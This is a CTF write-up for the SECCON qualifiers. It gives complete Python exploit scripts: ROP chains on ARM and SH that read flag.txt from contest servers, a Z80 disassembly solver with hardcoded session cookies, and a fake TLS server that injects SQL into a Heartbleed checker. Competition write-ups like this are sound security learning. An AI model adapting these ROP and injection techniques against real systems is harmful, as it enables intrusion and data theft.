## SECCON CTF Quals

### Overview

This time we won the 5th place in the game. Top 12 will be engaged in the final
at Tokyo, Japan on Feb. 6th. Here are some exploits I wrote during the game.

### Exploitation 300 arm

Simple ROP on ARM. Open 'flag.txt', read the content and then write back.

```python
#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('micro.pwn.seccon.jp', 10001))
f = s.makefile('rw', bufsize=0)

print readuntil(f, 'Input password: ');

flag_txt_addr = 0x4355
pop_r4_r5_r6_pc = 0x4220
mov_r0_r4_pop_r4_r5_r6_pc = 0x421c
ldmfd = 0x42b0
syscall_ret = 0x404c
printout = 0x42ec

rop = 'A' * 28
rop += p(pop_r4_r5_r6_pc)
rop += p(0x5) # r4 -> open
rop += p(0x41414141) * 2
rop += p(mov_r0_r4_pop_r4_r5_r6_pc) # pc

rop += p(0x41414141) * 3
rop += p(ldmfd) # pc

rop += p(flag_txt_addr) # r1 'flag.txt' addr
rop += p(0x0) # r2 flags
rop += p(0x0) # r3 mode
rop += p(0x41414141) * 4 # r4 - r6, r11

rop += p(syscall_ret)

rop += p(pop_r4_r5_r6_pc)
rop += p(0x3) # r4 -> read
rop += p(0x41414141) * 2
rop += p(mov_r0_r4_pop_r4_r5_r6_pc) # pc

rop += p(0x41414141) * 3
rop += p(ldmfd) # pc

rop += p(0x3) # fd
rop += p(0x1fff0000) # buffer
rop += p(1000) # count
rop += p(0x41414141) * 4 # r4 - r6, r11

rop += p(syscall_ret)

rop += p(pop_r4_r5_r6_pc)
rop += p(0x4) # r4 -> write
rop += p(0x41414141) * 2
rop += p(mov_r0_r4_pop_r4_r5_r6_pc) # pc

rop += p(0x41414141) * 3
rop += p(ldmfd) # pc

rop += p(0x1) # fd
rop += p(0x1fff0000) # buffer
rop += p(1000) # count
rop += p(0x41414141) * 4 # r4 - r6, r11

rop += p(syscall_ret)

f.write(rop + '\n')
print (f.read(1024))
```

### Exploitation 500 SH

Still an ROP but this time the structure is SH, which is big endian. But I
think it is simpler than the work on ARM.

```python
#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('>I', v)

def u(v):
    return struct.unpack('>I', v)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('micro.pwn.seccon.jp', 10000))
f = s.makefile('rw', bufsize=0)

print readuntil(f, 'Input password: ')

flag_txt_addr = 0x4319
pop_r7_r6_r5_r4_pc_r8 = 0x424c
syscall_ret = 0x4028
data_addr = 0xffa000
printout = 0x42a0

rop = 'A' * 16 # padding
rop += p(pop_r7_r6_r5_r4_pc_r8)
rop += p(0x41414141) # r8

rop += p(0x0) # r7 modes
rop += p(0x0) # r6 flags
rop += p(flag_txt_addr) # r5 'flag.txt'
rop += p(0x5) # r4 -> open
rop += p(syscall_ret)
rop += p(0x41414141) # r8

rop += p(pop_r7_r6_r5_r4_pc_r8)
rop += p(1000) # r7 count
rop += p(data_addr) # r6 buffer
rop += p(0x3) # r5 fd
rop += p(0x3) # r4 -> read
rop += p(syscall_ret)
rop += p(0x41414141) # r8

rop += p(pop_r7_r6_r5_r4_pc_r8)
rop += p(1000) # r7 count
rop += p(data_addr) # r6 buffer
rop += p(0x1) # r5 fd
rop += p(0x4) # r4 -> write
rop += p(syscall_ret)
rop += p(0x41414141) # r8

f.write(rop + '\n')
print (f.read(1024))
```

### Binary 200 Let's disassemble

It gives you some opcodes, and then you should give back the assembly. The
target architecture is Z80. Totally 100 rounds.

```python
#!/usr/bin/python
import requests
import struct
import socket
import telnetlib
import pwnlib
import pwn

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

def dis(hex_val):
    url = 'http://www2.onlinedisassembler.com/odaweb/_set'
    cookies = {'sessionid':'2h4isq6ytst6gu9rqu9wn9ryngrotk50',
           '_ga':'GA1.2.722795681.1417831855',
           '_gat': '1'}
    payload = {'arch':'z80',
        'base_address':'',
        'hex_val':hex_val,
        'endian':'default'}
    r = requests.post(url, data=payload, cookies=cookies)

    url = 'http://www2.onlinedisassembler.com/odaweb/_refresh'
    payload = {'id': '19884'}
    r = requests.post(url, data=payload, cookies=cookies)
    result = r.text
    import re
    pat = re.compile("<insn>(.*)</insn>")
    return pat.findall(result)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('disassemble.quals.seccon.jp', 23168))
f = s.makefile('rw', bufsize=0)

i = 0
while(True):
    print 'round: %d' % i
    ret = readuntil(f, ': ')
    assem = readuntil(f, '\n').replace(' ','').replace('\n','')
    readuntil(f, '? ')

    print assem
    result = dis(assem)
    print result
    f.write(result + '\n')
    i += 1
    if (i == 100): break

print f.read(1024)
```

### Web 300 Heartbleed

The site lets you put into the site and the port you want to detect whether it
has the heartbleed vulnerability. And then it will insert the result into the
database(sqlite). After that it will select out the result just inserted into
which cause an SQL injection. So we should just create a fake server and then
try to communicate with the script it use to detect 'Heartbleed'. Here is the
server code:

```python
import struct
import socket
import datetime

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('', 44444))
sock.listen(1024)

try:
    while True:
        conn, addr = sock.accept()
        try:
            conn.settimeout(1)
            data = conn.recv(128)

            package = ''
            package += '\x16\x01\x01\x00\x01'
            conn.send(package + '\x0e')

            data = conn.recv(256) # heartbeat

            payload = '\' union all SELECT flag from ssFLGss WHERE \'x\'!=\''
            package = '\x18\x01\x01' + struct.pack('>H', len(payload))
            conn.send(package + payload)

        except:
            pass
        finally:
            conn.close()
except:
    pass
finally:
    sock.close()
```

memeda@0ops
